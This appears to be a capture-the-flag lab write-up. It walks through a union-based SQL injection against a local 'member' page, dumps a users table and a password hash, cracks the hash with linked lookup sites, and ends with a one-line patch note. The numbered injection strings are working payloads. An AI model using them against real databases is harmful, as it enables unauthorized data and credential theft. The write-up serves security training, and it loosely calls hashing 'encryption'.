# Tools

- [Hash analyzer](https://www.tunnelsup.com/hash-analyzer/#google_vignette)
- [Hash lookup table](https://crackstation.net/)

# Exploit

We first try some random inputs in `http://localhost:8080/?page=member` and we notice that we get sql error messages.
Then we have to follow these steps:
1. `1 ORDER BY 1` to `1 ORDER BY 3` to determine the number of columns
2. `1 union all select database(), version()` to get the database name and it's version
3. `1 union all select 1,group_concat(table_name) from Information_schema.tables where table_schema=database()` to get the tables name
4. `1 union all select 1,group_concat(column_name) from Information_schema.columns where table_name=0x7573657273` to get columns name
5. `1 union all select 1,group_concat(Commentaire,0x0a) from users` to check the content of that table
6. `1 union all select 1,group_concat(countersign,0x0a) from users` to get the password
7. `5ff9d0165b4f92b14994e5c685cdce28` we get this encrypted string that we decrypt to `FortyTwo`.
8. We know that the flag are `sha256` encrypted so we encrypt `fortytwo` using that algorithm

# Patch

Prepare the input and sanitize the query